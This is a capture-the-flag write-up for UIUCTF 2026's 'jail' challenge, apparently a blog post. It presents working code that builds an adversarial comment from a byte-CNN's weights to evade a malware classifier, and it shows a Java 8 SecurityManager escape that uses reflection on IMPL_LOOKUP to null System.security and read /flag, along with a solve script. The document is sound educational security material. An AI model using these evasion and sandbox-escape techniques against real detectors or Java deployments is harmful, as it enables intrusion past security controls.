@@ -1,0 +1,496 @@
+---
+title: 'UIUCTF 2026 - jail'
+description: 'Steering a byte-CNN malware classifier to a benign verdict with an adversarial comment, then escaping a Java SecurityManager through the trusted MethodHandles lookup'
+date: 2026-08-09
+tags: ['writeup', 'misc', 'jail', 'sandbox-escape', 'adversarial-ml', 'java', 'uiuctf', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+## Challenge Description
+
+> jail = Java + AI + Jail
+>
+> The training of the AI model for this challenge was supported in part by the Illinois Computes project which is supported by the University of Illinois Urbana-Champaign and the University of Illinois System
+>
+> `ncat --ssl jail-fabd5e60c631dc497b3b.chal.uiuc.tf 1337`
+>
+> author: thealtofwar
+
+The handout is a single tarball:
+
+```text
+challenge/Dockerfile
+challenge/Jail.java
+challenge/flag
+challenge/main.py
+challenge/model.py
+challenge/model.safetensors
+challenge/nsjail.cfg
+```
+
+You submit Java source line by line, terminate with `DONE`, and the service compiles and runs it. There are two completely independent gates between you and the flag: a neural network that inspects your source, and a `SecurityManager` that supervises your code at runtime. Both have to fall.
+
+## Initial Analysis
+
+`main.py` is the whole pipeline:
+
+```python
+with torch.no_grad():
+    model = MaliciousDetection()
+    model.load_state_dict(load_file("model.safetensors"))
+
+    source_tensor = torch.tensor(list(source.encode("utf8")), dtype=torch.long).unsqueeze(0)
+    logits = model(source_tensor)
+
+    if torch.sigmoid(logits) >= 0.1:
+        print("malicious code detected")
+        exit()
+
+os.chdir("/tmp")
+shutil.copy("/Jail.java", "Jail.java")
+
+with open("UserClass.java", "w") as f:
+    f.write(source)
+
+os.system("javac UserClass.java 2>&1")
+os.system("javac Jail.java 2>&1")
+os.system("java Jail 2>&1")
+```
+
+So the classifier gets the raw UTF-8 bytes of the source, and the verdict threshold is a strict `0.1` — the model has to be quite confident the code is benign.
+
+`Jail.java` installs the sandbox and hands control over:
+
+```java
+public class Jail {
+    public static void main(String[] args) {
+        System.setSecurityManager(new JailSecurityManager());
+        UserClass.run();
+    }
+}
+```
+
+And the `Dockerfile` tells us the runtime is `openjdk-8-jdk` on Ubuntu 22.04, with the flag at `/flag` inside an nsjail chroot. Java 8 is the last release where a `SecurityManager` is a normal, fully-supported thing — which is exactly why the challenge uses it.
+
+## Gate 1: The AI Detector
+
+### Architecture
+
+`model.py` is a textbook character-level CNN operating directly on bytes:
+
+```python
+class MaliciousDetection(nn.Module):
+    def __init__(self, vocab_size=257, embed_dim=32, num_filters=64, dropout_rate=0.5):
+        self.embedding = nn.Embedding(vocab_size, embed_dim, padding_idx=256)
+
+        self.conv1 = nn.Conv1d(embed_dim, num_filters, kernel_size=3)
+        self.conv2 = nn.Conv1d(embed_dim, num_filters, kernel_size=5)
+        self.conv3 = nn.Conv1d(embed_dim, num_filters, kernel_size=10)
+        self.conv4 = nn.Conv1d(embed_dim, num_filters, kernel_size=20)
+
+        self.pool = nn.AdaptiveMaxPool1d(1)
+        self.dropout = nn.Dropout(dropout_rate)
+        self.fc = nn.Linear(num_filters * 4, 1)
+
+    def forward(self, x):
+        x_emb = self.embedding(x).permute(0, 2, 1)
+
+        act1 = F.relu(self.conv1(x_emb))
+        act2 = F.relu(self.conv2(x_emb))
+        act3 = F.relu(self.conv3(x_emb))
+        act4 = F.relu(self.conv4(x_emb))
+
+        c1, idx1 = torch.max(act1, dim=2)
+        c2, idx2 = torch.max(act2, dim=2)
+        c3, idx3 = torch.max(act3, dim=2)
+        c4, idx4 = torch.max(act4, dim=2)
+
+        merged = torch.cat((c1, c2, c3, c4), dim=1)
+        flat = self.dropout(merged)
+        logits = self.fc(flat)
+
+        return logits
+```
+
+Four convolutions with kernel sizes 3, 5, 10 and 20, each producing 64 filters, each global-max-pooled to a single number, concatenated into a 256-dimensional feature vector and pushed through one linear layer. In other words:
+
+```text
+logit = bias + sum over 256 filters of  w[f] * max over all windows of relu(conv[f])
+```
+
+Three properties of that expression are exploitable.
+
+### Weakness 1: max-pooling is monotone
+
+The feature for filter `f` is a **maximum over every window in the input**. Appending text to the source can only ever make that maximum larger or leave it unchanged — it can never lower it. So padding is a one-directional lever.
+
+That would be bad news if all the weights pushed the same way. They don't:
+
+```text
+fc bias      -0.05535505712032318
+fc weights   119 negative, 137 positive
+             min -0.09127753973007202, max 0.10224910080432892
+```
+
+119 of the 256 filters carry a **negative** weight. Driving those filters up drives the logit **down**, and the max-pool guarantees I can only ever drive features up. Any exploit code I write is untouchable — but I can bolt on a payload of padding that saturates the negative-weight filters and drags the total below the threshold.
+
+### Weakness 2: each convolution position is independent
+
+I do not have to search for the padding text. The pre-activation of filter `f` at a window is
+
+```text
+score = bias[f] + sum over j of  W[f, :, j] . emb(byte[t + j])
+```
+
+Every kernel position `j` contributes independently of the others, because the convolution is linear and the bytes only enter through the embedding lookup. So the byte sequence that maximally excites a filter is just the per-position argmax, computed exactly with no search:
+
+```python
+# S[f, j, b] = EMB[b] . Wc[f, :, j]
+S = torch.einsum('bd,fdj->fjb', EMB[AL], Wc)
+best, idx = S.max(dim=2)           # (64, k)
+```
+
+That gives one optimal k-gram per filter per kernel size — 256 candidate chunks in total.
+
+### Weakness 3: dropout is live
+
+`main.py` never calls `model.eval()`. PyTorch modules default to training mode, so `nn.Dropout(0.5)` is **active** during the check: half the 256 features are randomly zeroed and the survivors scaled by 2. The verdict is a coin flip, not a function.
+
+That is fine, and actually helps. Under the dropout mask the logit is a random variable with
+
+```text
+E[logit]   = the eval-mode logit
+Var[logit] = sum over filters of (w[f] * c[f])^2
+```
+
+If I concentrate the whole margin in one huge filter, mean and standard deviation grow together and the pass rate stalls. If I spread it across many filters, the mean grows like `n` while the standard deviation only grows like `sqrt(n)`. Spreading wins.
+
+### Building the padding
+
+The padding rides inside a `/* ... */` comment so it is syntactically inert. Two bytes have to be banned from the alphabet:
+
+- `*`, so the blob can never accidentally close the comment.
+- `\`, because Java processes `\uXXXX` unicode escapes in an earlier translation phase than lexing — **even inside comments** — so a stray `\u` would be a compile error.
+
+Everything else in printable ASCII is fair game.
+
+```python
+import torch, math
+from attack import m, EMB, CONVS, W, B, feats, logit_eval, pass_prob
+
+# printable ASCII, minus '*' so the padding can never close a /* */ comment
+ALLOWED = [b for b in range(0x20, 0x7F) if b not in (ord('*'), ord(chr(92)))]
+AL = torch.tensor(ALLOWED)
+
+EXPLOIT = open("exploit.java").read()
+
+# ---- per-filter optimal k-gram -------------------------------------------
+cands = []
+for conv in CONVS:
+    Wc = conv.weight.detach()          # (64, 32, k)
+    bc = conv.bias.detach()
+    k = Wc.shape[2]
+    # S[f, j, b] = EMB[b] . Wc[f, :, j]
+    S = torch.einsum('bd,fdj->fjb', EMB[AL], Wc)
+    best, idx = S.max(dim=2)           # (64, k)
+    for f in range(Wc.shape[0]):
+        s = bytes(ALLOWED[i] for i in idx[f].tolist())
+        cands.append(s.decode())
+
+cands = list(dict.fromkeys(cands))
+SEP = " " * 24
+
+
+def chunk_feats(strings):
+    out = []
+    for s in strings:
+        out.append(feats(SEP + s + SEP))
+    return torch.stack(out)
+
+
+CF = chunk_feats(cands)                                  # (N, 256)
+base = feats(EXPLOIT)
+
+cur = base.clone()
+chosen = []
+for step in range(400):
+    newc = torch.maximum(CF, cur.unsqueeze(0))
+    logits = newc @ W + B
+    i = int(logits.argmin())
+    if float(logits[i]) >= float(cur @ W + B) - 1e-6:
+        break
+    cur = newc[i]
+    chosen.append(cands[i])
+
+pad = SEP.join(chosen)
+src = "/*" + SEP + pad + SEP + "*/\n" + EXPLOIT
+assert "*/" not in pad
+
+lg = logit_eval(src)
+print("chunks:", len(chosen), "len:", len(src))
+print("eval logit:", lg, "sigmoid:", 1 / (1 + math.exp(-lg)))
+print("pass prob :", pass_prob(src))
+open("payload.java", "w").write(src)
+```
+
+Each candidate is scored padded with 24 spaces on either side so its own boundary windows are accounted for, and the greedy loop combines features with `torch.maximum` — which is exactly what concatenation does to a max-pool. The result:
+
+```text
+chunks: 118 len: 4709
+eval logit: -14.27181339263916 sigmoid: 6.336215238749955e-07
+pass prob : 0.998199999332428
+```
+
+From `+5.10` on the bare exploit to `-14.27`, comfortably past the `-2.197` needed for `sigmoid < 0.1`. Spread over 118 filters, the dropout noise only costs about 0.15% of runs, and a failed attempt is just a reconnect.
+
+The finished padding is one enormous line of noise:
+
+```text
+/*                        Y ,22i+YNv);++D+3ys/                        (int v I"!:2i ,Taom;
+                          m!""s$q " + :i", 3od                        3aat28Prq`"+3)Jp,ewC ...
+```
+
+## Gate 2: The Java Sandbox
+
+Now the harder half. `JailSecurityManager` overrides nearly every check to throw unconditionally:
+
+```java
+class JailSecurityManager extends SecurityManager {
+    public void checkAccept(String host, int port) { throw new SecurityException(); }
+    public void checkAccess(Thread t)              { throw new SecurityException(); }
+    public void checkConnect(String host, int port){ throw new SecurityException(); }
+    public void checkCreateClassLoader()           { throw new SecurityException(); }
+    public void checkDelete(String file)           { throw new SecurityException(); }
+    public void checkExec(String cmd)              { throw new SecurityException(); }
+    public void checkLink(String lib)              { throw new SecurityException(); }
+    public void checkListen(int port)              { throw new SecurityException(); }
+    public void checkRead(FileDescriptor fd)       { throw new SecurityException(); }
+    public void checkWrite(String file)            { throw new SecurityException(); }
+    // ...
+
+    public void checkRead(String file) {
+        // allow the loader to load the class
+        if (file.equals("/tmp/UserClass.class")) {
+            return;
+        }
+        throw new SecurityException();
+    }
+
+    public void checkPermission(Permission perm) {
+        if (perm.getName().equals("setSecurityManager") || perm.implies(new RuntimePermission("setSecurityManager"))) {
+            throw new SecurityException();
+        }
+    }
+
+    public void checkPackageAccess(String pkg) {
+        if (pkg.startsWith("sun")) {
+            throw new SecurityException();
+        }
+    }
+}
+```
+
+The critical detail is that these checks are **unconditional**. They ignore the `AccessControlContext` entirely, so `AccessController.doPrivileged` buys nothing — a privileged block still hits the same `throw`. Any code path that reaches `checkRead(String)` is dead, and every Java-level file read in the JDK (`FileInputStream`, `RandomAccessFile`, `File.exists`, NIO channels, `ZipFile`) goes through it. Reading `/flag` while the manager is installed is not on the table. The manager itself has to go.
+
+### checkPermission is the hole
+
+Look at what `checkPermission` actually rejects. Only a permission literally *named* `setSecurityManager`, or one whose `implies` returns true for `RuntimePermission("setSecurityManager")`. `BasicPermission.implies` starts with a class check:
+
+```java
+public boolean implies(Permission p) {
+    if ((p == null) || (p.getClass() != getClass()))
+        return false;
+    // ...
+}
+```
+
+Different `Permission` subclass means `false`. So `ReflectPermission("suppressAccessChecks")` and `RuntimePermission("accessDeclaredMembers")` both sail straight through. (`AllPermission` would be caught, since its `implies` returns true for everything — but nothing needs it.)
+
+**Full reflection is permitted.** `Class.getDeclaredField`, `setAccessible(true)`, `Field.set` — all of it. And `checkPackageAccess` only guards packages starting with `sun`, so `java.lang`, `java.lang.reflect` and `java.lang.invoke` are all reachable.
+
+### The obvious move, and why it fails
+
+The textbook escape is to null out the private field that backs the manager:
+
+```java
+Field f = System.class.getDeclaredField("security");
+f.setAccessible(true);
+f.set(null, null);
+```
+
+On the target JDK it throws `NoSuchFieldException`. Dumping the fields explains why:
+
+```text
+openjdk version "1.8.0_492"
+
+public static final java.io.InputStream java.lang.System.in
+public static final java.io.PrintStream java.lang.System.out
+public static final java.io.PrintStream java.lang.System.err
+private static volatile java.io.Console java.lang.System.cons
+private static java.util.Properties java.lang.System.props
+private static java.lang.String java.lang.System.lineSeparator
+```
+
+No `security`. But disassembling `System` proves the field is still there:
+
+```text
+  public static java.lang.SecurityManager getSecurityManager();
+    Code:
+       0: getstatic     #27                 // Field security:Ljava/lang/SecurityManager;
+       3: areturn
+```
+
+Recent 8u builds hardened `sun.reflect.Reflection` with a field filter (`fieldFilterMap`, a `Map<Class<?>, String[]>`) and registered `System.security` in it. `Class.privateGetDeclaredFields` calls the native `getDeclaredFields0`, then strips filtered entries before handing the array back. The field is invisible to reflection.
+
+Fixing the filter map itself is not an option either — it lives in `sun.reflect`, and `checkPackageAccess` blocks anything starting with `sun`. The two hardening measures cover each other.
+
+### IMPL_LOOKUP
+
+`java.lang.invoke.MethodHandles` resolves members through **JVM linkage** (`MethodHandleNatives.resolve`), not through `Class.getDeclaredFields`. The field filter simply does not apply on that path.
+
+What it needs is a `Lookup` with enough privilege. `MethodHandles.Lookup` keeps a static `IMPL_LOOKUP` whose `allowedModes` is `TRUSTED`, and `Lookup.checkSecurityManager` bails out immediately for it:
+
+```java
+void checkSecurityManager(Class<?> refc, MemberName m) {
+    SecurityManager smgr = System.getSecurityManager();
+    if (smgr == null)  return;
+    if (allowedModes == TRUSTED)  return;
+    // ...
+}
+```
+
+`IMPL_LOOKUP` itself sits in `java.lang.invoke`, which the package filter allows, and it is not in the field filter map. So:
+
+```java
+Field f = MethodHandles.Lookup.class.getDeclaredField("IMPL_LOOKUP");  // java.lang.invoke - allowed
+f.setAccessible(true);                                                 // suppressAccessChecks - allowed
+MethodHandles.Lookup lk = (MethodHandles.Lookup) f.get(null);          // TRUSTED
+lk.findStaticSetter(System.class, "security", SecurityManager.class)
+  .invoke((SecurityManager) null);
+```
+
+Every step is permitted by this particular manager:
+
+| Step | Check performed | Verdict |
+| --- | --- | --- |
+| `getDeclaredField` | `checkPermission(RuntimePermission("accessDeclaredMembers"))` + `checkPackageAccess("java.lang.invoke")` | allowed |
+| `setAccessible(true)` | `checkPermission(ReflectPermission("suppressAccessChecks"))` | allowed |
+| `findStaticSetter` | short-circuited by `allowedModes == TRUSTED` | allowed |
+
+Probing it on the target JDK confirms all three:
+
+```text
+       got /trusted
+[OK]   IMPL_LOOKUP field
+       sm now = null
+[OK]   Lookup.findStaticSetter(System.security)
+       FLAG: uiuctf{test_flag_local}
+[OK]   read /flag
+```
+
+With `System.security` nulled, the sandbox is gone and `/flag` is an ordinary file read.
+
+## Exploitation
+
+The exploit half, before padding:
+
+```java
+import java.lang.reflect.*;
+import java.lang.invoke.*;
+
+public class UserClass {
+    public static void run() {
+        try {
+            Field f = MethodHandles.Lookup.class.getDeclaredField("IMPL_LOOKUP");
+            f.setAccessible(true);
+            MethodHandles.Lookup lk = (MethodHandles.Lookup) f.get(null);
+            lk.findStaticSetter(System.class, "security", SecurityManager.class).invoke((SecurityManager) null);
+            java.io.BufferedReader r = new java.io.BufferedReader(new java.io.FileReader("/flag"));
+            String s;
+            while ((s = r.readLine()) != null) System.out.println(s);
+        } catch (Throwable e) {
+            System.out.println(e);
+        }
+    }
+}
+```
+
+`run()` cannot declare `throws`, because `Jail.main` calls it without handling anything and `Jail.java` is fixed — hence the `try`/`catch`.
+
+Running `craft.py` prepends the 4001-byte adversarial comment, and the two gates are verified separately before touching the remote. First the detector, replicating `main.py` exactly (including the missing `model.eval()`, so dropout is live):
+
+```text
+passes detector 200/200
+```
+
+Then the escape, inside a real `openjdk-8-jdk` container running the actual `Jail.java`:
+
+```text
+--- running ---
+uiuctf{test_flag_local_end_to_end}
+```
+
+## Solve Script
+
+The service speaks TLS and needs SNI, otherwise the handshake fails with `TLSV1_UNRECOGNIZED_NAME`:
+
+```python
+import socket, ssl, sys, time
+
+HOST, PORT = "jail-fabd5e60c631dc497b3b.chal.uiuc.tf", 1337
+payload = open("challenge/payload.java", "rb").read()
+
+ctx = ssl.create_default_context()
+ctx.check_hostname = False
+ctx.verify_mode = ssl.CERT_NONE
+
+s = ctx.wrap_socket(socket.create_connection((HOST, PORT), timeout=30), server_hostname=HOST)
+s.settimeout(120)
+
+buf = b""
+# read until the banner's DONE prompt appears
+deadline = time.time() + 30
+while b"DONE" not in buf and time.time() < deadline:
+    try:
+        d = s.recv(4096)
+    except socket.timeout:
+        break
+    if not d:
+        break
+    buf += d
+sys.stdout.write(buf.decode(errors="replace"))
+sys.stdout.flush()
+
+s.sendall(payload + b"\nDONE\n")
+
+out = b""
+while True:
+    try:
+        d = s.recv(4096)
+    except socket.timeout:
+        break
+    if not d:
+        break
+    out += d
+print("=== response ===")
+print(out.decode(errors="replace"))
+```
+
+```text
+== proof-of-work: disabled ==
+Java Sandbox Runner: type code in line by line and then type DONE. UserClass.run is invoked, e.g:
+...
+=== response ===
+Note: Jail.java uses or overrides a deprecated API.
+Note: Recompile with -Xlint:deprecation for details.
+uiuctf{4dv3r4r14l_y3t_funct10n4l_182df23ea}
+```
+
+## Flag
+
+```text
+uiuctf{4dv3r4r14l_y3t_funct10n4l_182df23ea}
+```
+
+The revenge version of this challenge patches both classifier weaknesses and turns it into a much tighter problem — writeup [here](/blog/uiuctf-2026-smaller-jail).
